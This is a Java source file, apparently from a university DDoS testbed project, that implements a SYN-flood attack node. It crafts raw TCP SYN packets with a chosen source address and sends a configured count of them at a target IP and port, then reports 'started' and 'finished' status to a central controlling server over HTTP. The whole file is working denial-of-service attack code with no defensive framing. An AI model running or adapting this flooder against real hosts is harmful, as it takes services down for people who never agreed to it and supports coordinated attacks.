package edu.cust.ddos;

import static com.savarese.rocksaw.net.RawSocket.getProtocolByName;

import java.io.IOException;
import java.net.InetAddress;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;

import org.apache.http.Consts;
import org.apache.http.HttpEntity;
import org.apache.http.NameValuePair;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;
import org.savarese.vserv.tcpip.TCPPacket;

import com.savarese.rocksaw.net.RawSocket;

public class SynFlood extends Thread {

	private Map<?, ?> data;

	private InetAddress serverAddr;

	private int serverPort;
	
//	private Random random = new Random();

	public SynFlood(InetAddress serverAddr, int serverPort, Map<?, ?> data) {
		this.serverAddr = serverAddr;
		this.serverPort = serverPort;
		this.data = data;
	}

	int addressAsWord(InetAddress address) {
		int result = 0;
		for (byte b : address.getAddress()) {
			result = result << 8 | (b & 0xFF);
		}
		return result;
	}

	void mysleep(long millis) {
		if (millis < 4) {
			return;
		}
		try {
			Thread.sleep(millis);
		} catch (InterruptedException ex) {
			ex.printStackTrace();
		}
	}

	void sendBack(CloseableHttpClient client, String id, String message) {
		HttpPost post = new HttpPost(String.format("http://%s:%d/ddos/adm/dosNodeStatusNotifyAjax", serverAddr.getHostAddress(), serverPort));
		List<NameValuePair> params = new ArrayList<NameValuePair>();
		params.add(new BasicNameValuePair("id", id));
		params.add(new BasicNameValuePair("msg", message));
		try {
			UrlEncodedFormEntity entity = new UrlEncodedFormEntity(params, Consts.UTF_8);
			entity.setContentType("application/x-www-form-urlencoded");
			post.setEntity(entity);
			try(CloseableHttpResponse httpResponse = client.execute(post)){
				if (httpResponse.getStatusLine().getStatusCode() == 200) {
					HttpEntity httpEntity = httpResponse.getEntity();
					String result = EntityUtils.toString(httpEntity);// 取出应答字符串
					System.out.println(String.format("Successfully notified: %s; %s", message, result));
				}
//				post.releaseConnection();
			}
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

	void sendSyn(RawSocket socket, InetAddress localAddr, int localPort, InetAddress targetAddr, int targetPort) {
		try {
			TCPPacket tcp = new TCPPacket(1);
			byte[] data = new byte[100];
			tcp.setData(data);
			tcp.setIPVersion(4);
			tcp.setSourceAsWord(addressAsWord(localAddr));
			tcp.setDestinationAsWord(addressAsWord(targetAddr));
			tcp.setIPFlags(2);
			tcp.setTTL(64);
			tcp.setIPHeaderLength(5);
			tcp.setIPPacketLength(40);
			tcp.setProtocol(TCPPacket.PROTOCOL_TCP);
			tcp.computeIPChecksum();

			tcp.setSourcePort(localPort);
			tcp.setDestinationPort(targetPort);
			tcp.setControlFlags(TCPPacket.MASK_SYN);
			tcp.setSequenceNumber(100);
			tcp.setWindowSize(64240);
			tcp.setTCPHeaderLength(5);
			tcp.computeTCPChecksum();
			int length = tcp.getIPPacketLength();
			socket.write(targetAddr, data, 0, length);
		} catch (IOException ex) {
			ex.printStackTrace();
		}
	}

	@Override
	public void run() {
		// TODO Auto-generated method stub
		String id = (String)data.get("nodeId");
		int startupDelay = ((Double) data.get("startupDelay")).intValue();
		int interval = ((Double) data.get("interval")).intValue();
		int count = ((Double) data.get("count")).intValue();
		String targetIp = (String) data.get("targetIp");
		int targetPort = ((Double) data.get("targetPort")).intValue();
		String localIp = (String) data.get("localIp");
		CloseableHttpClient client = HttpClients.createDefault();
		try {
			InetAddress localAddr = localIp.startsWith("127.") ? InetAddress.getLocalHost()
					: InetAddress.getByName(localIp);
			mysleep(startupDelay);
			sendBack(client, id, "已开始");
			RawSocket socket = new RawSocket();
			socket.open(RawSocket.PF_INET, getProtocolByName("tcp"));
			socket.setIPHeaderInclude(true);
			for (int i = 65000 - count; i < 65000; i++) {
				sendSyn(socket, localAddr, i, InetAddress.getByName(targetIp), targetPort);
				mysleep(interval);
			}
			socket.close();
			sendBack(client, id, "已结束");
		} catch (IOException ex) {
			ex.printStackTrace();
		} finally {
			try {
				client.close();
			}catch(IOException ex) {
				ex.printStackTrace();
			}
		}
	}

}
